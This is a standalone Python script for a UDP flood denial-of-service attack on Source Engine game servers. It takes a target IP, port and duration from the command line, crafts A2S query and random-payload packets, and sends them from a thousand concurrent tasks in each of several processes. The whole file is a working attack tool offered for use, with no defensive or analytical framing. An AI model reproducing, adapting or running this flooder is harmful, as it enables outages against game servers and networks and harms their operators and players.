import socket, asyncio, random, time, argparse, multiprocessing

# Arguments
parser = argparse.ArgumentParser()
parser.add_argument("--ip", type=str, required=True, help="Target IP")
parser.add_argument("--port", type=int, required=True, help="Target Port")
parser.add_argument("--time", type=int, required=True, help="Attack duration in seconds")
parser.add_argument("--times", type=int, default=1, help="Number of concurrent full attack instances")
args = parser.parse_args()

ip = args.ip
port = args.port
DURATION = args.time

def generate_packets():
    packets = []
    a2s_rules = b"\xFF\xFF\xFF\xFFV" + bytes(random.getrandbits(8) for _ in range(50))
    packets.append(a2s_rules)
    for _ in range(5):
        packets.append(b"\xFF\xFF\xFF\xFF" + bytes(random.getrandbits(8) for _ in range(random.randint(500, 1400))))
    a2s_info = b"\xFF\xFF\xFF\xFFTSource Engine Query\x00"
    packets.append(a2s_info)
    return packets

async def flood(stop_time):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    packets = generate_packets()
    while time.time() < stop_time:
        try:
            for data in packets:
                sock.sendto(data, (ip, port))
        except Exception:
            pass
    sock.close()

async def main_concurrent():
    stop_time = time.time() + DURATION
    tasks = [asyncio.create_task(flood(stop_time)) for _ in range(1000)]
    await asyncio.gather(*tasks, return_exceptions=True)

def run_attack_instance():
    asyncio.run(main_concurrent())

if __name__ == "__main__":
    print(f"🔥 Launching {args.times} full attack instance(s)...")
    processes = []
    for _ in range(args.times):
        p = multiprocessing.Process(target=run_attack_instance)
        p.start()
        processes.append(p)
    for p in processes:
        p.join()
